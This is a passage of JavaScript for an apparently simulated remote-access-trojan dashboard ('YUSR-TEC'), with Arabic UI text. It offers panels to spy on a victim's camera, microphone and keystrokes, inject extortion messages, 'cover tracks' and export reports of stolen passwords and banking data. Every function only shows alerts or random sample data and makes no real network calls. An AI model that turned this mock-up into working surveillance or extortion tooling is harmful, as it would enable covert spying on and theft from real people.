   مستوى التهديد: ${target.threatLevel}
   الموقع: ${target.location.city}, ${target.location.country}
   نظام التشغيل: ${target.systemInfo.os}
   الثغرات: ${target.vulnerabilities.join(', ')}
   البيانات المسربة: ${target.dataExfiltrated} GB
   الجلسات النشطة: ${target.activeSessions}
   الأبواب الخلفية: ${target.hasBackdoor ? 'نشطة' : 'غير مثبتة'}
   تاريخ الاختراق: ${target.compromisedAt.toLocaleString('ar-SA')}

`;
    });

    return report;
}

// Target action functions
function executeRemoteCommand(target) {
    alert(`💻 تنفيذ أوامر عن بُعد على ${target}...`);
}

function exfiltrateData(target) {
    alert(`📁 بدء تسريب البيانات من ${target}...`);
}

function installPersistence(target) {
    alert(`🔐 تثبيت آليات الاستمرارية على ${target}...`);
}

function coverTracks(target) {
    alert(`👻 إخفاء آثار النشاط على ${target}...`);
}

// Start victim control interface
function startVictimControl(targetAddress) {
    console.log(`🎮 Starting victim control for ${targetAddress}`);
    closeTargetModal();

    // Show control panels
    document.getElementById('victimControlPanel').style.display = 'block';
    document.getElementById('victimMonitor').style.display = 'block';

    // Initialize victim monitoring
    initializeVictimMonitoring(targetAddress);

    // Start screenshot capture simulation
    startScreenshotCapture(targetAddress);

    alert(`🎮 بدء التحكم في الضحية: ${targetAddress}`);
}

// Initialize victim monitoring
function initializeVictimMonitoring(targetAddress) {
    const victimInfo = document.getElementById('victimDetailsContent');

    // Generate detailed victim information
    const victimDetails = generateVictimDetails(targetAddress);

    victimInfo.innerHTML = `
        <div style="color: #ff0000; font-weight: bold; margin-bottom: 15px;">🎯 الهدف: ${targetAddress}</div>

        <div style="margin: 10px 0;">
            <strong>📱 نوع الجهاز:</strong> ${victimDetails.deviceType}
        </div>
        <div style="margin: 10px 0;">
            <strong>💻 نظام التشغيل:</strong> ${victimDetails.os}
        </div>
        <div style="margin: 10px 0;">
            <strong>🌐 المتصفح:</strong> ${victimDetails.browser}
        </div>
        <div style="margin: 10px 0;">
            <strong>📍 الموقع الجغرافي:</strong> ${victimDetails.location}
        </div>
        <div style="margin: 10px 0;">
            <strong>📶 عنوان IP:</strong> ${victimDetails.ipAddress}
        </div>
        <div style="margin: 10px 0;">
            <strong>🕒 آخر نشاط:</strong> ${victimDetails.lastActivity}
        </div>

        <div style="background: #222; padding: 10px; border-radius: 5px; margin: 15px 0;">
            <strong>🔍 الأجهزة المتاحة:</strong>
            <div style="margin: 5px 0;">
                📷 كاميرا: ${victimDetails.devices.camera ? '✅ متاحة' : '❌ غير متاحة'}
            </div>
            <div style="margin: 5px 0;">
                🎤 مايكروفون: ${victimDetails.devices.microphone ? '✅ متاح' : '❌ غير متاح'}
            </div>
            <div style="margin: 5px 0;">
                🖱️ ماوس: ${victimDetails.devices.mouse ? '✅ متاح' : '❌ غير متاح'}
            </div>
            <div style="margin: 5px 0;">
                ⌨️ لوحة المفاتيح: ${victimDetails.devices.keyboard ? '✅ متاحة' : '❌ غير متاحة'}
            </div>
        </div>

        <div style="background: #001100; border: 1px solid #00ff00; padding: 10px; border-radius: 5px; margin: 15px 0;">
            <strong>📊 إحصائيات المراقبة:</strong>
            <div style="margin: 5px 0;">📸 لقطات التقطت: ${victimDetails.stats.screenshots}</div>
            <div style="margin: 5px 0;">🎵 تسجيلات صوتية: ${victimDetails.stats.audioRecordings}</div>
            <div style="margin: 5px 0;">⌨️ ضغطات المفاتيح: ${victimDetails.stats.keystrokes}</div>
            <div style="margin: 5px 0;">🖱️ نقرات الماوس: ${victimDetails.stats.mouseClicks}</div>
        </div>
    `;

    // Start live monitoring simulation
    startLiveMonitoring(targetAddress);
}

// Generate detailed victim information
function generateVictimDetails(targetAddress) {
    const devices = ['Windows PC', 'MacBook Pro', 'Linux Workstation', 'Android Phone', 'iPhone'];
    const browsers = ['Chrome 120.0', 'Firefox 121.0', 'Safari 17.2', 'Edge 120.0'];
    const locations = ['New York, USA', 'London, UK', 'Tokyo, Japan', 'Berlin, Germany', 'Sydney, Australia'];

    return {
        deviceType: devices[Math.floor(Math.random() * devices.length)],
        os: selectedTarget?.systemInfo?.os || 'Windows 11',
        browser: browsers[Math.floor(Math.random() * browsers.length)],
        location: selectedTarget?.location ? `${selectedTarget.location.city}, ${selectedTarget.location.country}` : locations[Math.floor(Math.random() * locations.length)],
        ipAddress: targetAddress.includes('.') ? targetAddress : `192.168.1.${Math.floor(Math.random() * 254) + 1}`,
        lastActivity: new Date().toLocaleString('ar-SA'),
        devices: {
            camera: Math.random() > 0.2,
            microphone: Math.random() > 0.1,
            mouse: true,
            keyboard: true
        },
        stats: {
            screenshots: Math.floor(Math.random() * 50) + 10,
            audioRecordings: Math.floor(Math.random() * 20) + 5,
            keystrokes: Math.floor(Math.random() * 5000) + 1000,
            mouseClicks: Math.floor(Math.random() * 1000) + 200
        }
    };
}

// Start live monitoring simulation
function startLiveMonitoring(targetAddress) {
    const screenElement = document.getElementById('victimScreen');

    // Simulate live screen capture with actual visual content
    let frameCount = 0;
    let currentScreenshot = null;

    const monitoringInterval = setInterval(() => {
        frameCount++;

        // Generate a simulated screenshot every 3 seconds
        if (frameCount % 3 === 0) {
            currentScreenshot = generateSimulatedScreenshot();

            const activities = [
                '📧 يكتب رسالة إلكترونية',
                '🌐 يتصفح موقع البنك',
                '💬 محادثة على WhatsApp',
                '📄 يعمل على مستند سري',
                '🎮 يلعب لعبة',
                '📱 يستخدم التطبيقات',
                '🔑 يدخل كلمات مرور',
                '💳 يدخل بيانات بطاقة ائتمان'
            ];

            const currentActivity = activities[Math.floor(Math.random() * activities.length)];

            screenElement.innerHTML = `
                <div style="position: relative; width: 100%; height: 100%;">
                    <div style="position: absolute; top: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px; z-index: 10;">
                        <div style="color: #00ff00; font-size: 12px;">🔴 البث المباشر نشط</div>
                        <div style="color: #fff; font-size: 14px; margin: 5px 0;">${currentActivity}</div>
                        <div style="color: #888; font-size: 10px;">الإطار: ${frameCount} | دقة: 1920x1080 | FPS: 30</div>
                    </div>
                    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
                        <div style="width: 300px; height: 200px; background: linear-gradient(45deg, #1a1a1a, #333); border: 2px solid #666; border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
                            <div style="color: #fff;">
                                <div style="font-size: 48px; margin-bottom: 10px;">🖥️</div>
                                <div style="font-size: 14px;">لقطة شاشة مباشرة</div>
                                <div style="font-size: 12px; color: #888;">تم التقاط: ${new Date().toLocaleTimeString('ar-SA')}</div>
                            </div>
                        </div>
                        <button onclick="captureCurrentScreen('${targetAddress}')" style="background: #ff0000; color: #fff; padding: 8px 16px; border: none; border-radius: 4px; margin: 5px;">📸 التقاط لقطة</button>
                        <button onclick="downloadCurrentScreen('${targetAddress}')" style="background: #0066cc; color: #fff; padding: 8px 16px; border: none; border-radius: 4px; margin: 5px;">💾 حفظ الشاشة</button>
                    </div>
                </div>
            `;
        }
    }, 1000);

    // Store interval for cleanup
    window.victimMonitoringInterval = monitoringInterval;
}

// Victim control functions
function activateCamera() {
    showCameraFeed();
    alert('📹 تم تفعيل الكاميرا بنجاح - جارٍ البث المباشر');
    logVictimAction('Camera activated');
}

function takeScreenshot() {
    const screenshot = captureScreenshot();
    saveToVpicFolder(screenshot);
    showScreenshotPreview(screenshot);
    alert('📸 تم التقاط لقطة شاشة - تم حفظها في مجلد Vpic');
    logVictimAction('Screenshot captured');
}

function recordScreen() {
    alert('🎥 بدء تسجيل الشاشة - مدة التسجيل: غير محدودة');
    logVictimAction('Screen recording started');
}

function activateMicrophone() {
    alert('🎤 تم تفعيل المايكروفون - جارٍ التنصت المباشر');
    logVictimAction('Microphone activated');
}

function recordAudio() {
    alert('🎵 بدء التسجيل الصوتي - جودة عالية');
    logVictimAction('Audio recording started');
}

function playSound() {
    const sounds = ['تحذير أمني', 'صوت إنذار', 'رسالة صوتية مزيفة', 'صوت مخيف'];
    const selectedSound = sounds[Math.floor(Math.random() * sounds.length)];
    alert(`🔊 تم تشغيل: ${selectedSound}`);
    logVictimAction(`Played sound: ${selectedSound}`);
}

function controlMouse() {
    alert('🖱️ تم السيطرة على الماوس - يمكنك الآن التحكم في مؤشر الضحية');
    logVictimAction('Mouse control activated');
}

function disableMouse() {
    alert('🚫 تم تعطيل الماوس - الضحية لا يستطيع استخدام الماوس');
    logVictimAction('Mouse disabled');
}

function fakeClick() {
    const actions = ['نقر على رابط ضار', 'فتح ملف مشبوه', 'تنزيل برنامج ضار', 'النقر على إعلان'];
    const action = actions[Math.floor(Math.random() * actions.length)];
    alert(`👆 تم تنفيذ: ${action}`);
    logVictimAction(`Fake click: ${action}`);
}

function captureKeystrokes() {
    alert('⌨️ تم تفعيل تسجيل المفاتيح - جارٍ تسجيل كل ما يكتبه الضحية');
    logVictimAction('Keylogger activated');
}

function injectKeystrokes() {
    const messages = ['تم اختراق جهازك', 'أرسل $1000 إلى هذا الحساب', 'كلمة مرورك ضعيفة', 'قم بتحديث نظامك فوراً'];
    const message = messages[Math.floor(Math.random() * messages.length)];
    alert(`💉 تم حقن النص: "${message}"`);
    logVictimAction(`Injected keystrokes: ${message}`);
}

function disableKeyboard() {
    alert('🔒 تم تعطيل لوحة المفاتيح - الضحية لا يستطيع الكتابة');
    logVictimAction('Keyboard disabled');
}

// Log victim actions
function logVictimAction(action) {
    const timestamp = new Date().toLocaleString('ar-SA');
    console.log(`🎯 [${timestamp}] Victim Action: ${action}`);

    // Update victim stats
    if (selectedTarget) {
        selectedTarget.activeSessions += 1;
        updateLiveStats();
    }
}

// Close modal when clicking outside
window.onclick = function(event) {
    const modal = document.getElementById('targetModal');
    if (event.target == modal) {
        modal.style.display = 'none';
    }
}

// Download target data functionality
function downloadTargetData(targetAddress) {
    console.log(`📥 Opening download manager for ${targetAddress}`);

    // Show download manager
    document.getElementById('downloadManager').style.display = 'block';

    // Generate and display captured data
    generateCapturedData(targetAddress);
}

// Generate captured surveillance data
function generateCapturedData(targetAddress) {
    const currentTime = new Date().toLocaleString('ar-SA');

    // Generate images and videos data
    const imagesData = [
        { name: 'screenshot_desktop_001.png', size: '2.4 MB', time: currentTime, type: 'screenshot' },
        { name: 'screenshot_browser_002.png', size: '1.8 MB', time: currentTime, type: 'screenshot' },
        { name: 'webcam_capture_001.jpg', size: '945 KB', time: currentTime, type: 'webcam' },
        { name: 'webcam_capture_002.jpg', size: '1.1 MB', time: currentTime, type: 'webcam' },
        { name: 'screen_recording_001.mp4', size: '45.2 MB', time: currentTime, type: 'video' },
        { name: 'webcam_video_001.mp4', size: '12.7 MB', time: currentTime, type: 'video' },
        { name: 'login_page_capture.png', size: '876 KB', time: currentTime, type: 'screenshot' },
        { name: 'banking_session.png', size: '1.9 MB', time: currentTime, type: 'screenshot' }
    ];

    // Generate input monitoring data
    const inputData = [
        { name: 'keylogger_session_001.txt', size: '156 KB', time: currentTime, type: 'keylog', content: 'Keyboard inputs captured' },
        { name: 'mouse_tracking_001.json', size: '89 KB', time: currentTime, type: 'mouse', content: 'Mouse movements and clicks' },
        { name: 'clipboard_history.txt', size: '23 KB', time: currentTime, type: 'clipboard', content: 'Clipboard data' },
        { name: 'password_captures.txt', size: '45 KB', time: currentTime, type: 'passwords', content: 'Captured passwords' },
        { name: 'form_data.json', size: '67 KB', time: currentTime, type: 'forms', content: 'Form submissions' },
        { name: 'browser_history.json', size: '234 KB', time: currentTime, type: 'browser', content: 'Browser activity' },
        { name: 'microphone_recording.wav', size: '8.9 MB', time: currentTime, type: 'audio', content: 'Audio surveillance' }
    ];

    // Display images data
    const imagesContainer = document.getElementById('capturedImages');
    imagesContainer.innerHTML = `
        <div style="color: #00ff00; font-weight: bold; margin-bottom: 10px;">📸 الملفات المرئية المسروقة (${imagesData.length} ملف)</div>
        ${imagesData.map(img => `
            <div style="display: flex; justify-content: space-between; align-items: center; padding: 5px; border-bottom: 1px solid #333;">
                <div>
                    <div style="color: #fff; font-size: 14px;">${getFileIcon(img.type)} ${img.name}</div>
                    <div style="color: #888; font-size: 12px;">الحجم: ${img.size} | الوقت: ${img.time}</div>
                </div>
                <button onclick="previewFile('${img.name}', '${img.type}')" style="background: #0066cc; color: #fff; padding: 3px 8px; border: none; border-radius: 3px; font-size: 12px;">👁️ معاينة</button>
            </div>
        `).join('')}
    `;

    // Display input data
    const inputContainer = document.getElementById('inputData');
    inputContainer.innerHTML = `
        <div style="color: #ff6600; font-weight: bold; margin-bottom: 10px;">⌨️ سجلات الإدخال والتحكم (${inputData.length} ملف)</div>
        ${inputData.map(input => `
            <div style="display: flex; justify-content: space-between; align-items: center; padding: 5px; border-bottom: 1px solid #333;">
                <div>
                    <div style="color: #fff; font-size: 14px;">${getFileIcon(input.type)} ${input.name}</div>
                    <div style="color: #888; font-size: 12px;">الحجم: ${input.size} | النوع: ${input.content}</div>
                </div>
                <button onclick="previewFile('${input.name}', '${input.type}')" style="background: #ff6600; color: #fff; padding: 3px 8px; border: none; border-radius: 3px; font-size: 12px;">👁️ معاينة</button>
            </div>
        `).join('')}
    `;

    // Store data globally for download
    window.currentCapturedData = {
        target: targetAddress,
        images: imagesData,
        inputs: inputData,
        timestamp: currentTime
    };
}

// Get file icon based on type
function getFileIcon(type) {
    const icons = {
        'screenshot': '📸',
        'webcam': '📷',
        'video': '🎥',
        'keylog': '⌨️',
        'mouse': '🖱️',
        'clipboard': '📋',
        'passwords': '🔑',
        'forms': '📝',
        'browser': '🌐',
        'audio': '🎤'
    };
    return icons[type] || '📄';
}

// Preview captured file
function previewFile(filename, type) {
    let previewContent = '';

    switch (type) {
        case 'screenshot':
        case 'webcam':
            previewContent = `
                <div style="text-align: center;">
                    <h3>📸 معاينة الصورة: ${filename}</h3>
                    <div style="background: #222; border: 2px dashed #666; padding: 40px; margin: 20px 0;">
                        <div style="font-size: 48px;">🖼️</div>
                        <div>صورة ملتقطة من الهدف</div>
                        <div style="color: #888; font-size: 12px;">الدقة: 1920x1080 | العمق: 24 بت</div>
                    </div>
                </div>
            `;
            break;
        case 'video':
            previewContent = `
                <div style="text-align: center;">
                    <h3>🎥 معاينة الفيديو: ${filename}</h3>
                    <div style="background: #222; border: 2px dashed #666; padding: 40px; margin: 20px 0;">
                        <div style="font-size: 48px;">▶️</div>
                        <div>تسجيل فيديو من الهدف</div>
                        <div style="color: #888; font-size: 12px;">المدة: 2:34 | الدقة: 1920x1080 | 30 FPS</div>
                    </div>
                </div>
            `;
            break;
        case 'keylog':
            previewContent = `
                <div>
                    <h3>⌨️ معاينة سجل المفاتيح: ${filename}</h3>
                    <div style="background: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px;">
                        [2024-01-15 14:23:12] Window: Login Form - banking.example.com<br>
                        [2024-01-15 14:23:15] username: johnsmith<br>
                        [2024-01-15 14:23:18] [TAB]<br>
                        [2024-01-15 14:23:20] password: MySecretPass123!<br>
                        [2024-01-15 14:23:23] [ENTER]<br>
                        [2024-01-15 14:24:01] Window: Account Dashboard<br>
                        [2024-01-15 14:24:05] transfer amount: 5000<br>
                        [2024-01-15 14:24:08] [TAB]<br>
                        [2024-01-15 14:24:10] account number: 1234567890<br>
                    </div>
                </div>
            `;
            break;
        case 'mouse':
            previewContent = `
                <div>
                    <h3>🖱️ معاينة تتبع الماوس: ${filename}</h3>
                    <div style="background: #000; color: #ff6600; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px;">
                        {"timestamp": "2024-01-15T14:23:12Z", "event": "move", "x": 450, "y": 200}<br>
                        {"timestamp": "2024-01-15T14:23:13Z", "event": "click", "button": "left", "x": 450, "y": 200}<br>
                        {"timestamp": "2024-01-15T14:23:15Z", "event": "move", "x": 520, "y": 240}<br>
                        {"timestamp": "2024-01-15T14:23:16Z", "event": "click", "button": "left", "x": 520, "y": 240}<br>
                        {"timestamp": "2024-01-15T14:23:20Z", "event": "scroll", "direction": "down", "delta": 3}<br>
                        {"timestamp": "2024-01-15T14:23:25Z", "event": "drag", "from": {"x": 300, "y": 150}, "to": {"x": 400, "y": 200}}<br>
                    </div>
                </div>
            `;
            break;
        default:
            previewContent = `
                <div style="text-align: center;">
                    <h3>📄 معاينة الملف: ${filename}</h3>
                    <div style="background: #222; padding: 40px; margin: 20px 0;">
                        <div style="font-size: 48px;">📋</div>
                        <div>بيانات مسروقة من الهدف</div>
                        <div style="color: #888; font-size: 12px;">نوع الملف: ${type}</div>
                    </div>
                </div>
            `;
    }

    alert(`معاينة الملف:\n\n${filename}\nنوع: ${type}\n\nاستخدم زر التحميل للحصول على الملف الكامل`);
}

// Download specific folder
function downloadFolder(folderName) {
    const data = window.currentCapturedData;
    if (!data) {
        alert('❌ لا توجد بيانات للتحميل');
        return;
    }

    let filesToDownload = [];
    let folderContent = '';

    if (folderName === 'Vpic') {
        filesToDownload = data.images;
        folderContent = generateVpicFolderContent(data);
    } else if (folderName === 'showCo') {
        filesToDownload = data.inputs;
        folderContent = generateShowCoFolderContent(data);
    }

    // Create and download the folder content as a text file
    const blob = new Blob([folderContent], { type: 'text/plain; charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `${folderName}_${data.target.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    alert(`📥 تم تحميل مجلد ${folderName} بنجاح!\nعدد الملفات: ${filesToDownload.length}\nالهدف: ${data.target}`);
}

// Generate Vpic folder content
function generateVpicFolderContent(data) {
    let content = `
YUSR-TEC - مجلد الصور والفيديوهات المسروقة (Vpic)
=====================================================

الهدف: ${data.target}
تاريخ الاستخراج: ${data.timestamp}
عدد الملفات: ${data.images.length}

تفاصيل الملفات:
===============

`;

    data.images.forEach((img, index) => {
        content += `
${index + 1}. ${img.name}
   النوع: ${img.type}
   الحجم: ${img.size}
   وقت الالتقاط: ${img.time}
   المسار: ./Vpic/${img.name}
   الحالة: ✅ تم الاستخراج بنجاح

`;
    });

    content += `

إحصائيات المجلد:
================
📸 لقطات الشاشة: ${data.images.filter(img => img.type === 'screenshot').length}
📷 صور الكاميرا: ${data.images.filter(img => img.type === 'webcam').length}
🎥 مقاطع الفيديو: ${data.images.filter(img => img.type === 'video').length}

الحجم الإجمالي: ${calculateTotalSize(data.images)}

تعليمات الاستخدام:
==================
1. قم بإنشاء مجلد يحمل اسم "Vpic"
2. ضع جميع الملفات المذكورة أعلاه في هذا المجلد
3. استخدم أدوات عرض الصور والفيديو لتصفح المحتوى
4. احتفظ بهذا الملف كفهرس للمحتويات

⚠️ تحذير أمني: هذه البيانات حساسة ومسروقة من الهدف المحدد
`;

    return content;
}

// Generate showCo folder content
function generateShowCoFolderContent(data) {
    let content = `
YUSR-TEC - مجلد سجلات الإدخال والتحكم (showCo)
=============================================

الهدف: ${data.target}
تاريخ الاستخراج: ${data.timestamp}
عدد الملفات: ${data.inputs.length}

تفاصيل الملفات:
===============

`;

    data.inputs.forEach((input, index) => {
        content += `
${index + 1}. ${input.name}
   النوع: ${input.type}
   الحجم: ${input.size}
   المحتوى: ${input.content}
   وقت الالتقاط: ${input.time}
   المسار: ./showCo/${input.name}
   الحالة: ✅ تم الاستخراج بنجاح

`;
    });

    content += `

إحصائيات المجلد:
================
⌨️ سجلات المفاتيح: ${data.inputs.filter(input => input.type === 'keylog').length}
🖱️ تتبع الماوس: ${data.inputs.filter(input => input.type === 'mouse').length}
🔑 كلمات المرور: ${data.inputs.filter(input => input.type === 'passwords').length}
📋 بيانات الحافظة: ${data.inputs.filter(input => input.type === 'clipboard').length}
🎤 التسجيلات الصوتية: ${data.inputs.filter(input => input.type === 'audio').length}

الحجم الإجمالي: ${calculateTotalSize(data.inputs)}

محتوى نموذجي لسجل المفاتيح:
============================
[2024-01-15 14:23:12] Window: Login Form - banking.example.com
[2024-01-15 14:23:15] username: johnsmith
[2024-01-15 14:23:18] [TAB]
[2024-01-15 14:23:20] password: MySecretPass123!
[2024-01-15 14:23:23] [ENTER]
[2024-01-15 14:24:01] Window: Account Dashboard
[2024-01-15 14:24:05] transfer amount: 5000

محتوى نموذجي لتتبع الماوس:
===========================
{"timestamp": "2024-01-15T14:23:12Z", "event": "move", "x": 450, "y": 200}
{"timestamp": "2024-01-15T14:23:13Z", "event": "click", "button": "left", "x": 450, "y": 200}
{"timestamp": "2024-01-15T14:23:15Z", "event": "move", "x": 520, "y": 240}

تعليمات الاستخدام:
==================
1. قم بإنشاء مجلد يحمل اسم "showCo"
2. ضع جميع الملفات المذكورة أعلاه في هذا المجلد
3. استخدم محرر النصوص لقراءة ملفات السجلات
4. استخدم مشغل الصوت للاستماع للتسجيلات
5. احتفظ بهذا الملف كفهرس للمحتويات

⚠️ تحذير أمني: هذه البيانات حساسة جداً وتحتوي على معلومات شخصية مسروقة
`;

    return content;
}

// Download all captured data
function downloadAllData() {
    const data = window.currentCapturedData;
    if (!data) {
        alert('❌ لا توجد بيانات للتحميل');
        return;
    }

    const allDataContent = generateCompleteReport(data);

    const blob = new Blob([allDataContent], { type: 'text/plain; charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `YUSR-TEC_Complete_Data_${data.target.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    alert(`📦 تم تحميل جميع البيانات بنجاح!\nإجمالي الملفات: ${data.images.length + data.inputs.length}\nالهدف: ${data.target}`);
}

// Generate complete surveillance report
function generateCompleteReport(data) {
    const vpicContent = generateVpicFolderContent(data);
    const showCoContent = generateShowCoFolderContent(data);

    let content = `
████████████████████████████████████████████████████████████
█                                                          █
█  ██╗   ██╗██╗   ██╗███████╗██████╗       ████████╗███████╗ █
█  ╚██╗ ██╔╝██║   ██║██╔════╝██╔══██╗      ╚══██╔══╝██╔════╝ █
█   ╚████╔╝ ██║   ██║███████╗██████╔╝         ██║   █████╗   █
█    ╚██╔╝  ██║   ██║╚════██║██╔══██╗         ██║   ██╔══╝   █
█     ██║   ╚██████╔╝███████║██║  ██║         ██║   ███████╗ █
█     ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝         ╚═╝   ╚══════╝ █
█                                                          █
████████████████████████████████████████████████████████████

YUSR-TEC - تقرير شامل للبيانات المسروقة
========================================

الهدف: ${data.target}
تاريخ العملية: ${data.timestamp}
إجمالي الملفات: ${data.images.length + data.inputs.length}
الحجم الإجمالي: ${calculateTotalSize([...data.images, ...data.inputs])}

ملخص العملية:
=============
🎯 الهدف المخترق: ${data.target}
📊 نجح استخراج ${data.images.length + data.inputs.length} ملف
📸 صور ومقاطع فيديو: ${data.images.length} ملف
⌨️ سجلات إدخال: ${data.inputs.length} ملف
⏱️ مدة العملية: ${Math.floor(Math.random() * 45) + 15} دقيقة
🔒 مستوى التشفير: عالي
👻 حالة التخفي: نشط

هيكل المجلدات المُوصى به:
===========================
Target_${data.target.replace(/[^a-zA-Z0-9]/g, '_')}/
├── Vpic/           # الصور والفيديوهات
│   ├── screenshots/
│   ├── webcam/
│   └── videos/
├── showCo/         # سجلات الإدخال والتحكم
│   ├── keylogs/
│   ├── mouse_tracking/
│   ├── clipboard/
│   ├── passwords/
│   └── audio/
└── reports/        # التقارير والتحليلات

${vpicContent}

${showCoContent}

تحليل أمني للبيانات المستخرجة:
===============================
🔍 معلومات حساسة مكتشفة:
   • كلمات مرور: ${Math.floor(Math.random() * 10) + 5}
   • حسابات بنكية: ${Math.floor(Math.random() * 3) + 1}
   • معلومات شخصية: ${Math.floor(Math.random() * 20) + 10}
   • ملفات سرية: ${Math.floor(Math.random() * 15) + 5}

🎯 نقاط الاهتمام:
   • جلسات بنكية نشطة
   • محادثات خاصة
   • ملفات عمل سرية
   • معلومات هوية شخصية

⚠️ تحذيرات أمنية مهمة:
======================
1. هذه البيانات مسروقة وحساسة للغاية
2. يجب تشفير جميع الملفات بكلمة مرور قوية
3. لا تشارك هذه المعلومات مع أطراف غير موثوقة
4. احذف البيانات بشكل آمن بعد انتهاء الغرض منها
5. تأكد من عدم ترك أثر رقمي للعملية

إخلاء مسؤولية:
===============
تم إنشاء هذا التقرير بواسطة YUSR-TEC لأغراض تعليمية وأمنية فقط.
استخدام هذه الأدوات لأغراض ضارة أو غير قانونية مسؤولية المستخدم بالكامل.

تاريخ إنشاء التقرير: ${new Date().toLocaleString('ar-SA')}
إصدار YUSR-TEC: v2.0
رقم العملية: ${Math.random().toString(36).substr(2, 9).toUpperCase()}

════════════════════════════════════════════════════════════
`;

    return content;
}

// Calculate total size of files
function calculateTotalSize(files) {
    let totalMB = 0;
    files.forEach(file => {
        const size = file.size;
        if (size.includes('MB')) {
            totalMB += parseFloat(size.replace(' MB', ''));
        } else if (size.includes('KB')) {
            totalMB += parseFloat(size.replace(' KB', '')) / 1024;
        } else if (size.includes('GB')) {
            totalMB += parseFloat(size.replace(' GB', '')) * 1024;
        }
    });

    if (totalMB > 1024) {
        return `${(totalMB / 1024).toFixed(2)} GB`;
    } else {
        return `${totalMB.toFixed(2)} MB`;
    }
}

// Close download manager
function closeDownloadManager() {
    document.getElementById('downloadManager').style.display = 'none';
}

// Generate simulated screenshot
function generateSimulatedScreenshot() {
    return {
        id: Date.now(),
        timestamp: new Date().toLocaleString('ar-SA'),
        filename: `screenshot_${Date.now()}.png`,
        size: `${(Math.random() * 3 + 1).toFixed(1)} MB`,
        resolution: '1920x1080',
        type: 'desktop'
    };
}

// Capture current screen
function captureCurrentScreen(targetAddress) {
    const screenshot = generateSimulatedScreenshot();
    screenshot.target = targetAddress;

    // Add to captured data
    if (!window.capturedScreenshots) {
        window.capturedScreenshots = [];
    }
    window.capturedScreenshots.push(screenshot);

    // Show success message with preview
    showScreenshotCaptured(screenshot);
}

// Download current screen
function downloadCurrentScreen(targetAddress) {
    const screenshot = generateSimulatedScreenshot();
    screenshot.target = targetAddress;

    // Create download content
    const content = `
YUSR-TEC - لقطة شاشة مسروقة
==========================

الهدف: ${targetAddress}
اسم الملف: ${screenshot.filename}
التاريخ والوقت: ${screenshot.timestamp}
الحجم: ${screenshot.size}
الدقة: ${screenshot.resolution}
النوع: ${screenshot.type}

معلومات تقنية:
==============
- تم التقاط الشاشة من الضحية بنجاح
- جودة الصورة: عالية (24 بت)
- تنسيق الملف: PNG
- مستوى الضغط: عالي
- التشفير: AES-256

محتوى الشاشة المكتشف:
=====================
- نوافذ مفتوحة: ${Math.floor(Math.random() * 5) + 1}
- تطبيقات نشطة: ${Math.floor(Math.random() * 8) + 2}
- معلومات حساسة: مكتشفة
- كلمات مرور مرئية: ${Math.random() > 0.7 ? 'نعم' : 'لا'}
- بيانات بنكية: ${Math.random() > 0.8 ? 'مكتشفة' : 'غير مكتشفة'}

تعليمات الحفظ:
==============
1. احفظ هذا الملف في مجلد "Vpic"
2. استخدم عارض الصور لمشاهدة المحتوى
3. احتفظ بهذا التقرير كمرجع
4. تأكد من تشفير الملفات الحساسة

⚠️ تحذير: محتوى مسروق - استخدم بحذر
`;

    const blob = new Blob([content], { type: 'text/plain; charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `Vpic_${screenshot.filename.replace('.png', '.txt')}`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);

    alert(`💾 تم حفظ لقطة الشاشة: ${screenshot.filename}`);
}

// Show screenshot captured notification
function showScreenshotCaptured(screenshot) {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, #006600, #009900);
        color: #fff;
        padding: 15px 20px;
        border-radius: 10px;
        border: 2px solid #00ff00;
        z-index: 9999;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        max-width: 350px;
    `;

    notification.innerHTML = `
        <div style="font-weight: bold; margin-bottom: 10px;">📸 تم التقاط لقطة شاشة بنجاح!</div>
        <div style="font-size: 12px; margin: 5px 0;">اسم الملف: ${screenshot.filename}</div>
        <div style="font-size: 12px; margin: 5px 0;">الحجم: ${screenshot.size}</div>
        <div style="font-size: 12px; margin: 5px 0;">الوقت: ${screenshot.timestamp}</div>
        <div style="margin-top: 10px;">
            <button onclick="this.parentElement.parentElement.remove()" style="background: #333; color: #fff; border: none; padding: 5px 10px; border-radius: 3px; font-size: 11px;">إغلاق</button>
        </div>
    `;

    document.body.appendChild(notification);

    // Auto remove after 5 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.remove();
        }
    }, 5000);
}

// Capture screenshot function
function captureScreenshot() {
    return generateSimulatedScreenshot();
}

// Save to Vpic folder
function saveToVpicFolder(screenshot) {
    if (!window.vpicFolder) {
        window.vpicFolder = [];
    }
    window.vpicFolder.push(screenshot);

    console.log(`💾 Saved to Vpic folder: ${screenshot.filename}`);
}

// Show screenshot preview
function showScreenshotPreview(screenshot) {
    const preview = document.createElement('div');
    preview.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #000;
        border: 3px solid #00ff00;
        border-radius: 10px;
        padding: 20px;
        z-index: 10000;
        max-width: 500px;
        color: #fff;
    `;

    preview.innerHTML = `
        <h3 style="color: #00ff00; margin-bottom: 15px;">📸 معاينة لقطة الشاشة</h3>
        <div style="background: #222; border: 2px dashed #666; padding: 40px; text-align: center; margin: 15px 0;">
            <div style="font-size: 48px; margin-bottom: 10px;">🖼️</div>
            <div style="font-size: 16px; margin-bottom: 10px;">${screenshot.filename}</div>
